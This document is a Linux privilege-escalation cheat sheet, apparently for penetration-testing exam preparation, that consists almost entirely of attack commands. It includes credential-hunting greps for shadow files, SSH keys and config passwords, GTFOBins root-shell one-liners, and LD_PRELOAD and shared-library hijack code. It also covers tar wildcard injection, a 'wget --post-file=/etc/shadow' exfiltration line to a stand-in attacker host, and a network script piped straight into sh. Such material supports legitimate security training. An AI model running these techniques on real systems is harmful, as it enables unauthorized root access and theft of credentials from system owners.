# PHASE 8: PRIVILEGE ESCALATION

## 8.1 - Linux PrivEsc

> Run enumeration scripts FIRST, then follow decision tree.
> After finding vector, always verify before exploiting.

### Enumeration Scripts (run first)
```bash
# linPEAS (comprehensive - run first)
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
./linpeas.sh -a 2>&1 | tee linpeas_output.txt

# LinEnum (alternative)
./LinEnum.sh -t -s -k keyword

# pspy (monitor processes/cron without root)
./pspy64 -pf -i 1000

# Lynis (system audit)
./lynis audit system
```

### Manual Enumeration
```bash
# Basic info
id; whoami; uname -a; cat /etc/os-release
hostname; ip a; route; cat /etc/resolv.conf

# Sensitive files
cat /etc/passwd; cat /etc/shadow 2>/dev/null
cat /etc/crontab; ls -la /etc/cron.*
crontab -l; ls -la /var/spool/cron/

# SUID/SGID
find / -user root -perm -4000 -type f 2>/dev/null   # SUID
find / -uid 0 -perm -6000 -type f 2>/dev/null       # SGID

# Capabilities
getcap -r / 2>/dev/null

# Writable files/dirs
find / -writable -type f 2>/dev/null
find / -writable -type d 2>/dev/null

# Sudo version (check for CVEs)
sudo -V

# Defense checks
getenforce 2>/dev/null          # SELinux
aa-status 2>/dev/null           # AppArmor
iptables -L -n 2>/dev/null      # Firewall

# Hash identification ($1$=MD5, $5$=SHA-256, $6$=SHA-512, $y$=yescrypt)
cat /etc/shadow | grep -v ':\*:' | grep -v ':!:' | grep -v ':!!:'
```

### Credential Hunting (do on EVERY box)
```bash
# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
grep -rnE '^\-{5}BEGIN [A-Z0-9]+ PRIVATE KEY\-{5}$' /* 2>/dev/null
cat ~/.ssh/known_hosts

# History files
cat ~/.bash_history; cat /home/*/.bash_history 2>/dev/null
cat ~/.mysql_history 2>/dev/null

# Config files with passwords
find / -name "*.conf" -exec grep -l "password" {} \; 2>/dev/null
find / -name "*.xml" -exec grep -l "password" {} \; 2>/dev/null
find / -name "*.yml" -exec grep -l "password" {} \; 2>/dev/null
grep -rn "password" /etc/ /opt/ /var/www/ 2>/dev/null

# Web app configs
cat /var/www/html/wp-config.php 2>/dev/null
cat /var/www/html/configuration.php 2>/dev/null
cat /var/www/html/config.php 2>/dev/null

# Database creds
cat /etc/mysql/debian.cnf 2>/dev/null
cat ~/.my.cnf 2>/dev/null

# Environment variables
env; cat /etc/environment

# Mail/spool
ls -la /var/mail/ /var/spool/mail/ 2>/dev/null

# Backup files
find / -name "*.bak" -o -name "*.old" -o -name "*.backup" 2>/dev/null
```

### GTFOBins One-Liners (memorize — exam-frequent)
```bash
# SUID binaries (run as root if SUID bit set: chmod u+s)
# Find: find / -user root -perm -4000 -type f 2>/dev/null
./find . -exec /bin/sh -p \; -quit                       # find
./vim.basic -c ':!/bin/sh -p'                            # vim
./nmap --interactive    ;   !sh                          # nmap (old)
./nmap --script=/path/to/script.nse                      # nmap (modern, NSE script)
./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'   # perl
./python -c 'import os; os.setuid(0); os.system("/bin/sh")'           # python
./php -r "pcntl_exec('/bin/sh', ['-p']);"                # php
./bash -p                                                # bash (with -p preserves SUID)
./less file ; !sh                                        # less (pager escape)
./more file ; !sh                                        # more
./man man ; !sh                                          # man
./awk 'BEGIN {system("/bin/sh")}'                        # awk
./gdb -nx -ex 'python import os; os.execl("/bin/sh","sh","-p")' -ex quit   # gdb
./env /bin/sh -p                                         # env
./xxd /etc/shadow | xxd -r                               # xxd (read-only privesc)
./cp /bin/sh /tmp/sh; chmod u+s /tmp/sh                  # cp (only if dest is SUID-honored)
./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
./socat stdin exec:/bin/sh
./node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
./ruby -e 'exec "/bin/sh"'
./screen
./tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z /tmp/.x.sh -Z root  # tcpdump postrotate
./wget --post-file=/etc/shadow http://ATTACKER/          # read-only via wget
./curl file:///etc/shadow                                # read-only via curl
./ssh -o ProxyCommand=';sh 0<&2 1>&2' x                  # ssh ProxyCommand abuse
./openssl req -in /etc/shadow                            # read-only via openssl (error msg leaks)

# sudo abuse (sudo -l shows allowed)
sudo /usr/bin/find . -exec /bin/sh \; -quit
sudo /usr/bin/vim -c ':!/bin/sh'
sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
sudo /usr/bin/python -c 'import os; os.system("/bin/sh")'
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/less /etc/profile     ; !sh
sudo /usr/bin/man man               ; !sh
sudo /usr/bin/zip /tmp/x.zip /etc/hosts -T --unzip-command="sh -c /bin/sh"
sudo /usr/bin/tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo /usr/bin/apt-get changelog apt    ; !sh
sudo /usr/bin/git -p help        ; !sh
sudo /usr/bin/env /bin/sh

# LD_PRELOAD (sudoers has env_keep+=LD_PRELOAD)
cat > /tmp/pe.c <<EOF
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() { unsetenv("LD_PRELOAD"); setresuid(0,0,0); system("/bin/bash -p"); }
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so <any_allowed_sudo_binary>

# LD_LIBRARY_PATH (sudoers has env_keep+=LD_LIBRARY_PATH AND binary uses shared libs)
ldd /path/to/binary    # find a library it loads (e.g. libcustom.so)
cat > /tmp/hijack.c <<EOF
#include <stdio.h>
#include <stdlib.h>
static void hijack() __attribute__((constructor));
void hijack() { unsetenv("LD_LIBRARY_PATH"); setresuid(0,0,0); system("/bin/bash -p"); }
EOF
gcc -o /tmp/libcustom.so -shared -fPIC /tmp/hijack.c
sudo LD_LIBRARY_PATH=/tmp /path/to/binary

# Wildcard injection (tar, chown, rsync, 7z, zip)
# Cron runs: cd /backup; tar czf /tmp/x.tgz *
echo "" > '/backup/--checkpoint=1'
echo "" > '/backup/--checkpoint-action=exec=sh shell.sh'
echo 'cp /bin/bash /tmp/bash; chmod u+s /tmp/bash' > /backup/shell.sh
# Wait for cron → /tmp/bash is SUID root → /tmp/bash -p

# Cron runs: chown root:root /var/log/*
ln -s /etc/shadow /var/log/x   # if writable
# After cron: shadow now owned by root:root (no change), but with --reference= tricks:
echo "" > '/var/log/--reference=/tmp/payload'

# Reference: https://gtfobins.github.io/
```

### Decision Tree
```
What do we have?
├── sudo -l → GTFOBins for allowed commands (examples above)
│   └── sudo -l shows (ALL) → direct sudo su
├── SUID binary → Check against GTFOBins (examples above)
│   └── find / -user root -perm -4000 -type f 2>/dev/null
├── Writable cron script → Inject reverse shell
│   └── Monitor with pspy64 -pf -i 1000
├── Wildcard abuse in cron → tar --checkpoint injection
│   └── echo '---checkpoint=1' > /tmp/--checkpoint=1
├── Writable /etc/passwd → Add root user (openssl passwd -1)
│   └── Or cap_dac_override + vim to edit directly
├── Capabilities → Check all dangerous caps
│   ├── cap_setuid → vim.basic -c ':!sh'
│   ├── cap_dac_override → Modify protected files
│   ├── cap_sys_admin → Mount/namespace abuse
│   └── cap_setgid → Group-based file access
├── PATH abuse → Writable dir in PATH, create fake cmd
│   └── echo '#!/bin/bash\nchmod +s /bin/bash' > /writable/dir/cmd
├── LD_PRELOAD → env_keep+=LD_PRELOAD in sudoers
│   └── gcc -shared -fPIC -o /tmp/pe.so /tmp/pe.c -nostartfiles
├── Shared Object Hijack → Writable RUNPATH, custom .so
│   └── readelf -d binary | grep RUNPATH; ldd binary
├── Python Library Hijack → Writable Python module path
│   └── Check PYTHONPATH, writable site-packages
├── NFS root_squash → Create SUID binary on share
│   └── showmount -e target; mount -t nfs; gcc suid.c; chmod u+s
├── Docker group → docker run -v /:/mnt --rm -it alpine chroot /mnt sh
├── LXD group → lxd init, lxc image import, mount host fs
├── Kernel exploit → searchsploit linux kernel <version>
│   ├── Polkit/Pwnkit (CVE-2021-4034) → pkexec exploit
│   ├── Dirty Pipe (CVE-2022-0847) → kernels 5.8-5.17
│   ├── Baron Samedit (CVE-2021-3156) → sudo heap overflow
│   └── Netfilter CVEs (2021-22555, 2022-25636)
├── Restricted shell escape → rbash/rksh/rzsh bypass
│   ├── command substitution, env vars, shell functions
│   └── ssh -t user@target /bin/bash
├── Logrotate exploit → logrotten (versions 3.8.6-3.18.0)
├── Tmux session hijack → Weak session file permissions
├── Passive traffic capture → tcpdump/net-creds/PCredz
├── Disk group → debugfs on /dev/sdaX
├── ADM group → Read /var/log/ files
└── Kubernetes → kubelet API, token extraction, pod YAML
```